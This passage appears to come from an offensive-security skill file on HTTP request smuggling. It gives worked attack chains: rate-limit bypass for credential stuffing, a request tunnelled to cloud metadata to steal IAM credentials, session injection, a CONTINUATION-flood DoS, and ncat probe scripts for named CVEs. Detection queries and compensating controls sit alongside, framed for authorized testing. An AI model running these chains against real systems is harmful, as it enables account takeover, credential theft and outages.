- **Differential response**: the follow-up response must be unambiguously different — a 404 where a 200 is expected, or content that must have come from the smuggled request.
- **OOB callback**: the callback must be attributed to the smuggled request (unique marker), not to the containing request.
- **Cache poisoning**: the poisoned response must be served to independent clients, not just to the poisoning session.

**Signal patterns that are often noise:**

- **Response body length varies by 1-10 bytes** — probably per-request timing or connection-state artifact, not smuggling.
- **Delays that occur every N requests** — likely a rate-limiter or connection recycle.
- **Reproduction rate 2/10 or lower** — not enough to establish signal; either the class isn't present or the probe is unreliable.

**Report shape:**

- Exact bytes of the smuggling probe (hex-encoded if binary).
- Exact response of the follow-up.
- Reproduction rate across N trials.
- Environmental context (CDN pool member, source IP, timing window).
- The specific class (CL.TE / TE.CL / H2.CL / H2.TE / CL.0 / CSD / cache-poisoning / response-queue-poisoning).

## Composite Chain — Bypassing Rate-Limit for Credential Stuffing

Worked example:

1. Target: login endpoint (`/api/login`) rate-limited at 5 attempts per minute per IP at the WAF layer.
2. Attacker fingerprints CL.TE against the back-end.
3. Smuggle: front-end sees one request per WAF interval; back-end processes N smuggled login attempts within that interval.
4. Effect: rate-limiter is bypassed; attacker performs N × normal-rate credential attempts.
5. Combined with credential stuffing tool (route to appropriate tool skill), the class multiplies the attempt rate.

## Composite Chain — Smuggling to Reach Non-Public Endpoint Behind Cluster IP

Worked example:

1. Target: front-end proxy at `https://public.target.com`; back-end cluster serves `admin.target.com` (only reachable on the internal cluster IP).
2. Front-end routes based on Host header; requests with `Host: admin.target.com` are rejected at the front-end.
3. Attacker smuggles a request with `Host: admin.target.com` and a specific `X-Forwarded-For: <trusted-IP>` header that the admin back-end trusts.
4. Back-end processes the smuggled request, sees the trusted IP, allows the admin action.
5. Chain: smuggling (this file) → forwarded-header trust bypass → admin action.

## Composite Chain — Response-Queue Poisoning → Cross-User Response Delivery

Worked example:

1. Target: single-server web app; pipelining supported on HTTP/1.1 keepalive connections; app doesn't strictly enforce response ordering.
2. Attacker establishes a keepalive connection and pipelines:
   - Request A: `POST /api/orders` with a body sized to complete slightly slowly (some processing latency).
   - Request B: `GET /api/orders/list` — a request that would return the user's order list.
3. If the server's response queue misaligns, Response A's data may be delivered to the client waiting for Response B.
4. Attacker crafts Request A so the server-side processing produces a response containing specific target data — say, an admin summary the server has cached and would return under specific request headers.
5. Response for Request A misaligns to a different client's Request B, delivering the admin summary to that client.
6. If the pipeline includes a victim's request as Request B, the victim receives Response A (containing admin summary), leaking data to the attacker's control.

**Confirmation:**
- Pipeline test requests and observe response-ordering anomalies.
- Timing analysis on the misaligned response.

## Composite Chain — CL.0 + Log-Endpoint Poisoning → Auth-Session Injection

Worked example:

1. Target: single-server web app; CL.0 confirmed against `/api/log` (endpoint that ignores request body, always returns 202).
2. Attacker's page issues a same-origin `fetch` to `/api/log` (from a page hosted on a taken-over sibling subdomain, so same-site policy passes) with a body containing:
   ```
   POST /api/session/create HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded
   Cookie: session=<attacker-forged-session>
   Content-Length: 0
   
   ```
3. Victim's next navigation on `target.com` reuses the connection; the browser sends the natural next request.
4. The smuggled `POST /api/session/create` is processed first with the attacker's Cookie header; back-end creates a session bound to the attacker's cookie.
5. Victim's next request is now attached to the attacker-created session.
6. If the app treats session bootstrap as trust-establishing, the victim is now logged in as the attacker (or a session the attacker controls).

## HTTP/3 (QUIC) — Emerging Smuggling Surface

HTTP/3 uses QUIC as transport instead of TCP; the HTTP-layer framing shares HTTP/2's structure (frames, streams, HPACK-like QPACK for headers). The smuggling surface is not identical to HTTP/2's and remains research-stage as of 2026.

**Structural differences from HTTP/2:**
- Streams are transport-level (QUIC); no shared TCP-connection state means less per-connection smuggling surface.
- QPACK-based header compression differs from HPACK; specific parser bugs may exist.
- HTTP/3-to-HTTP/1.1 downgrade at the front-end is the primary smuggling surface (analogous to H2.CL/H2.TE).
- HTTP/3-to-HTTP/2 downgrade adds a second downgrade path.

**Known HTTP/3-adjacent CVEs:**
- Various QUIC-implementation CVEs in 2023–2025 (memory-corruption, DoS) — not smuggling per se but adjacent.
- Cloudflare's HTTP/3 stack has had specific CVEs; verify current advisories.
- Nginx's HTTP/3 support (experimental in 1.25+) has separate parser code that may have distinct smuggling bugs.

**Assessment approach:**
- Fingerprint HTTP/3 support: `Alt-Svc: h3=":443"` in HTTP/2 responses advertises HTTP/3 availability.
- Test HTTP/3 handshake with an HTTP/3-capable client (curl with HTTP/3 support, quiche-client, `http3-client`).
- Probes similar to H2.CL and H2.TE apply, with QUIC-specific injection points.

The class is emerging; specific CVE dissections belong in `http_request_smuggling_novel_deep.md` if verified against NVD.

## gRPC and HTTP/2-Native Back-End Considerations

gRPC uses HTTP/2 exclusively. A front-end that downgrades to HTTP/1.1 for gRPC breaks the protocol; a front-end that maintains HTTP/2 end-to-end has no downgrade smuggling surface. But gRPC-over-HTTP/2 introduces its own parser considerations:

- **gRPC framing** — messages are length-prefixed within HTTP/2 DATA frames; a smuggling payload embedded in a gRPC message reaches the gRPC server intact.
- **gRPC-Web** — a translation layer between HTTP/1.1 clients and HTTP/2 gRPC back-ends; introduces its own parser and its own smuggling surface.
- **gRPC service authentication via HTTP/2 headers** — smuggled headers can influence gRPC-level authentication when the front-end doesn't validate them.

**gRPC-Web translation layer specifics:**

gRPC-Web enables browser clients to call gRPC services via HTTP/1.1 or HTTP/2. The translation layer at the edge unpacks gRPC-Web (base64-encoded, HTTP-friendly) into native gRPC frames. The translation itself is a parser boundary:

- gRPC-Web request arrives as `POST /service/method` with `Content-Type: application/grpc-web-text` or `application/grpc-web+proto`.
- Translator decodes and re-frames as HTTP/2 gRPC.
- Malformed gRPC-Web that produces valid gRPC frames after translation is a smuggling class — the translator's parser and the back-end's parser disagree on frame boundaries.

**gRPC metadata as header injection surface:**

gRPC "metadata" fields (analogous to HTTP headers) are carried in HTTP/2 headers. When a gRPC-Web request is translated, malformed metadata may be preserved as HTTP/2 headers that the back-end processes as auth context.

**gRPC-native service mesh (Envoy sidecars, Linkerd):**

Service meshes route gRPC over mTLS between services. The mesh's front-end/back-end split creates smuggling considerations:
- Mesh sidecar terminates client mTLS, opens new mTLS to upstream sidecar.
- Downgrade from HTTP/2 to different HTTP/2 (with different HPACK compression state) is a parser boundary.
- Sidecar version skew across the mesh creates parser-differential opportunities.

**Assessment approach:**
- Identify gRPC endpoints (typically `Content-Type: application/grpc`, `application/grpc-web`, `application/grpc-web+proto`).
- Probe for gRPC-Web translation layer smuggling — the HTTP/1.1-to-HTTP/2 conversion may accept malformed HTTP/1.1 that produces valid HTTP/2.
- The gRPC-Web spec itself has been evolving; verify current implementations.
- For service-mesh deployments, fingerprint sidecar versions across the mesh and probe for version-skew-induced parser divergence.

**Historical gRPC-adjacent CVEs:**

- Envoy sidecar CVEs (CVE-2024-27919, CVE-2024-30255) — CONTINUATION flood at the sidecar layer.
- gRPC-Go CVE history includes CONTINUATION-flood-adjacent issues.
- Verify per current gRPC / Envoy versions.

## Composite Chain — HTTP/2 Tunnelling → Metadata Read

Worked example:

1. Target: AWS ALB (HTTP/2 edge) in front of Node.js (HTTP/1.1 back-end). CRLF preservation in `:path` confirmed.
2. Attacker sends an H2 request with `:path: /public\r\nGET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n`.
3. Front-end downgrades: HTTP/1.1 request line contains `/public\r\nGET /latest/meta-data/...`.
4. Back-end processes the first request (`/public`), returns its response. Then reads the buffer for the next request; sees `GET /latest/meta-data/...` — but the back-end resolves the URL to the local IMDS endpoint if it has metadata reach.
5. Response for the tunnelled request comes back within the same H2 stream; attacker parses it as the second response chunk.
6. Extracted IMDS credentials → cloud IAM access. Route to `cloud/aws.md`.

## Composite Chain — Smuggling → Antiforgery Bypass → CSRF State Change

Worked example (mirrors the CVE-2025-55315 class):

1. Target: ASP.NET Core app with Antiforgery middleware protecting all state-change endpoints.
2. Antiforgery check runs on the incoming request; requires a token in the request.
3. Smuggling primitive (see novel sibling for the specific ASP.NET Core class): the front-end and back-end disagree about where the request ends; the back-end processes a smuggled request that appears (from the middleware's perspective) to be part of a preceding authenticated request that already passed Antiforgery.
4. Effect: the smuggled request performs the state change without needing a valid Antiforgery token because the middleware treats it as continuation of the parent request.
5. Chain: smuggling (this file, primary owner) → antiforgery bypass → CSRF state change (`csrf.md`).

## Composite Chain — CONTINUATION Flood → Service Degradation as DoS Cover

Worked example (run only in DoS-authorized scope):

1. Target: Node.js < 21.2.0 or nghttp2 < 1.61.0 or Envoy pre-fix, or amphp/http, or Apache Traffic Server pre-fix.
2. Attacker sends a stream of HTTP/2 CONTINUATION frames without the END_HEADERS flag, forcing the server to buffer and HPACK-decode unbounded header data.
3. Server memory pressure escalates; either OOM or CPU exhaustion; service degrades or crashes.
4. Combined use: during the degraded window, other attacks (auth-brute-force with expected 429 responses that don't fire due to overloaded rate-limiter, or state-change requests that succeed while logging is broken) become easier.
5. Route CVE-specific version boundaries to `http_request_smuggling_novel_deep.md § HTTP/2 CONTINUATION Flood — 2024 CVE Cluster`.

## Composite Chain — Smuggling into Downstream Message Queue

Worked example:

1. Target: web front-end that publishes state-change events to a Kafka/RabbitMQ queue; the queue consumers act on those events (send emails, update databases).
2. Attacker smuggles a request that reaches the event-publishing code path with attacker-controlled data.
3. Queue consumer processes the poisoned event, performing actions attributed to the smuggled request's implied user.
4. Impact chains through the queue — the smuggled request appears legitimate to every downstream consumer.
5. Chain: smuggling (this file) → queue-message poisoning → downstream-consumer actions (route per specific consumer's skill).

## Post-Fix Detection

Verifying a smuggling fix on a target requires:

- **Version fingerprint** — Server headers for each component; where obscured, behavioral fingerprints per version.
- **Behavioral probe of the specific class** — send the exact probe that triggered the pre-fix behavior; observe rejection or expected response.
- **Reproduction across a fleet** — a claim like "the target's Tomcat is patched to 9.0.84" must be verified across every Tomcat instance in the fleet; a single unpatched pool member is exposed.

**Per-CVE probe scripts:**

```bash
# CVE-2023-46589 (Tomcat HTTP trailer smuggling) — post-fix probe
printf 'POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n5\r\nhello\r\n0\r\nTrailer-Name: value\r\n\r\n' "$target" | \
  ncat --ssl "$target" 443

# CVE-2024-27316 (Apache httpd HTTP/2 memory exhaustion) — carefully-scoped resource probe
# Runs in DoS-authorized scope only, with strict ceilings.

# CVE-2024-1135 (Gunicorn TE smuggling) — probe
printf 'POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: xchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG' "$target" | ncat "$target" 80
```

## Detection Signatures for Defenders

Signals defenders monitor during smuggling exploitation:

- **Timing anomalies on POST endpoints** — SIEM rule on response-time distribution for state-change endpoints; unusually long or unusually short response times relative to the endpoint's baseline are anomalous.
- **Pipelined request patterns** — request logs showing multiple pipelined requests on a single connection are unusual for typical browser traffic; multi-request per connection is normal for API clients but anomalous for form submissions.
- **Malformed request rejection spikes** — WAF logs showing a spike in "malformed HTTP" rejections may indicate probing.
- **Cache poisoning detection** — anomalous cache-hit ratio changes for specific URLs; sudden variance in cache response content for a URL.
- **Upstream error rate changes** — a back-end returning 400/500 spikes on specific endpoints correlates with smuggling attempts against those endpoints.

**Compensating controls:**
- Front-end enforces strict RFC compliance (rejects duplicate CL, mismatched CL+TE, malformed chunk encoding).
- HTTP/2 end-to-end (no HTTP/1.1 downgrade at the back-end).
- Per-request connection pooling instead of shared pools.
- Cache-key includes `Origin` header (defeats simple cache poisoning that doesn't match Origin).
- WebSocket handshakes validated with strict Origin allowlist.

**SIEM query examples:**

```
# Cross-connection response-time anomaly on state-change endpoints
index=web_access uri IN ("/account/*", "/api/state-change/*") method=POST
| eval bucket=floor(response_time_ms / 1000)
| stats count by bucket, uri
| where bucket > 10

# Malformed HTTP rejection spike
index=firewall_logs event_type="malformed_http" 
| bin _time span=5m
| stats count by _time, source_ip
| where count > 50
```

## Attack Sequencing for Real Engagements

The order in which smuggling classes are tested against a target matters — some probes are noisy (produce many WAF log entries), some are stealthy (single probes indistinguishable from noise), and some risk unintended state changes (any cache-poisoning attempt affects live users).

**Recommended sequencing:**

1. **Fingerprint the composition** — passive fingerprinting first (headers, response shapes). No smuggling probes yet.
2. **Read-only probes** — classical CL.TE / TE.CL timing probes with incomplete chunk termination. These produce delays but don't poison sockets.
3. **Differential-response probes** — pipelined requests where the follow-up should differ if socket was poisoned. Some poisoning may occur; use non-destructive smuggled prefixes.
4. **CL.0 confirmation on a specific endpoint** — targeted; use a specific endpoint likely to ignore body (redirects, static files).
5. **HTTP/2 downgrade probes** — H2.CL and H2.TE with non-destructive smuggled content.
6. **Cache-poisoning probes** — with a distinctive marker payload that can be cleaned up; monitor cache TTL and expiration.
7. **Client-side desync (CSD) demonstration** — attacker-hosted page + browser confirmation.
8. **Composite chain execution** — full end-to-end demonstration with reproduction evidence.

**Steps that require additional authorization:**
- Cache poisoning affects live users during the cache TTL window.
- CSD demonstration requires a browser executing attacker-controlled JS.
- Response-queue poisoning may misalign responses to legitimate users.
- Any probe that authenticates smuggled requests as another user requires explicit authorization for the impersonation.

## Historical CVE Recurrence

Smuggling classes recur across the ecosystem. Understanding the recurrence pattern predicts where the next CVE will emerge.

**Recurrence patterns:**

- **CL vs TE ambiguity** — despite RFC 7230 clarifying the preference, new HTTP-parsing implementations regularly re-implement the ambiguity. Every year sees new CVEs in specific parser implementations.
- **HTTP/2 header injection into HTTP/1.1** — the H2.CL / H2.TE class emerged when HTTP/2 became widely adopted; the downgrade code path is a recurring source of bugs.
- **Chunked-transfer parser bugs** — implementations regularly get chunk-size parsing wrong (radix inference, leading whitespace, extension handling).
- **Trailer-handling bugs** — HTTP trailer support is under-tested; CVE-2023-46589 was the first widely-visible expression, but the class is broader.
- **CONTINUATION frame handling** — the April-2024 cluster illustrates the class was widely present across independent implementations.

**Historical class summary:**

- **2000s** — CL vs TE ambiguity first documented (Watchfire whitepaper 2005); early implementations vulnerable.
- **2010–2015** — mod_jk / AJP smuggling classes.
- **2019** — James Kettle's DEF CON talk revived the class; classical CL.TE / TE.CL rediscovered against modern targets.
- **2020** — HTTP/2-to-HTTP/1 downgrade classes (H2.CL, H2.TE) formalized.
- **2021** — CL.0 and client-side desync classes formalized.
- **2022** — pause-based desync and connection-state attacks documented.
- **2023** — HTTP/2 request tunnelling primitives.
- **2024** — HTTP Garden (differential fuzzing); CONTINUATION flood cluster; Tomcat trailer smuggling.
- **2025** — ASP.NET Core CVE-2025-55315 (smuggling → CSRF bypass) as chain-into-CSRF class.
- **Ongoing** — HTTP/3-to-HTTP/1 downgrade emerging surface.

The class-recurrence rate implies smuggling CVEs will continue at roughly 2–6 per year across major implementations. Any assessment must fingerprint the target's current versions and match against the current advisory list.

## Advanced Tooling

Beyond the base's tooling catalog, several advanced tools support the operational depth in this file:

**Differential-fuzzing frameworks:**

- **HTTP Garden research toolkit** — the fuzzing toolchain from `arXiv:2405.17737`; available at `github.com/narfindustries/http-garden`. Runs differential fuzzing across a docker-compose lab of common servers. Useful for reproducing per-parser divergences in a controlled environment. Each server is dockerized and the harness sends paired requests observing responses per server. For a target with unknown parser posture, running the target's server in the HTTP Garden lab (if available) reveals its class exposure quickly.
- **`http-parser-diff`** — smaller differential-fuzzing framework targeting specific parser pairs. Less coverage than HTTP Garden but faster to run against a specific pairing.

**Smuggling-specific scanners:**

- **HTTP Request Smuggler (Burp extension)** — base file covers this. For advanced usage, its scanner API can be scripted for target-specific probe sequences.
- **`smuggler`** (`github.com/defparam/smuggler`) — Python-based CL.TE / TE.CL / TE.TE detection with obfuscation variants; useful for scale scanning. Modular payload catalog; add custom variants per target.
- **`nuclei` HTTP smuggling templates** — nuclei's community templates include several smuggling detection payloads; useful for continuous monitoring. Templates evolve — check the nuclei-templates repo for post-2024 additions.
- **`h2csmuggler`** — for HTTP/2-cleartext-upgrade smuggling (where an edge proxies `Upgrade: h2c` to a back-end that becomes an HTTP/2 speaker). Repository: `github.com/BishopFox/h2csmuggler`. Specific to h2c-upgrade path; not applicable to HTTPS-only environments.

**Byte-timing control:**

- **Turbo Intruder scripts for pause-based desync** — release-timer scripts in the PortSwigger Research repo demonstrate the exact byte-release patterns for pause-based confirmation. Specifically: send full headers, wait N ms, release body byte by byte, watch for a split point.
- **`hakoriginfinder`** — for identifying origin IPs behind CDNs; useful for testing back-end directly (bypassing WAF) to isolate the class.

**HTTP/2 and HTTP/3 conformance:**

- **`h2spec`** — the HTTP/2 conformance test suite; useful for identifying non-standard HTTP/2 handling that may correlate with smuggling exposure. Run against a target and observe which spec sections it violates.
- **`quiche-client`** — QUIC/HTTP/3 client for reaching HTTP/3 endpoints; useful for HTTP/3 smuggling probes (emerging class).

**Manual raw-byte manipulation:**

- **`ncat`, `openssl s_client`, `curl --http1.1 --http2 --http3`** — for exact-byte manual PoCs.
- **`hex` / `xxd`** — for constructing byte-precise smuggling payloads.

**Scale scanning:**

- **`ffuf` + smuggling wordlists** — for scan-scale detection across a target inventory.
- **Custom Python scripts using `raw-socket`** — for exact-byte control at scale; used when Burp/Turbo Intruder are not appropriate for the scale.

## Summary

Advanced smuggling depth is about composition — the specific HTTP/2 downgrade behavior of each front-end, the exact per-parser divergence in each transducer chain, the specific cache-key shape that permits poisoning, the routing-key trust boundary the front-end assumes, and the WAF-vs-back-end split that produces the bypass class. Fingerprint the composition first; match probes to the composition; confirm with statistical significance across trials; sequence attack steps by risk and authorization scope; and route composite chains to sibling skills for downstream impact classes.
